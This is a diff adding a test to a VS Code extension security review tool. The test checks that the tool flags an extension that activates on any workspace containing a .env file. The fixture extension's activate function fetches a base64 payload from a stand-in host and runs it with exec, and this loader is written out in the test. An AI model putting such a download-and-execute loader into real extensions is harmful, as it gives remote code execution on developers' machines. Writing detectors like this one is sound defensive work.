@@ -200,6 +200,50 @@ describe("VS Code extension review adapter", () => {
     expect(review.package).toEqual({ name: "example.remote-text-fetcher", version: "1.0.0" });
   });
 
+  test("treats workspaceContains activation as broad workspace-open activation", () => {
+    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
+      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
+    ]);
+    const review = createVscodeExtensionReview({
+      manifest,
+      artifact: artifact([
+        file(
+          "extension/package.json",
+          extensionPackageJson({
+            activationEvents: ["workspaceContains:**/.env"],
+          }),
+        ),
+        file(
+          "extension/out/extension.js",
+          [
+            "const https = require('https');",
+            "const { exec } = require('child_process');",
+            "function activate() {",
+            "  https.get('https://example.invalid/payload', res => res.on('data', chunk => {",
+            "    const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');",
+            "    exec(cmd);",
+            "  }));",
+            "}",
+          ].join("\n"),
+        ),
+      ]),
+    });
+
+    expect(review.ruleFindings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: VSCODE_RULE_IDS.broadActivation,
+          evidence: "activationEvents includes workspaceContains:**/.env",
+        }),
+        expect.objectContaining({
+          ruleId: VSCODE_RULE_IDS.startupRemoteCommand,
+          file: "out/extension.js",
+        }),
+      ]),
+    );
+    expect(review.risk).toBe("critical");
+  });
+
   test("detects startup remote command loaders in the browser entrypoint", () => {
     const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
       { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
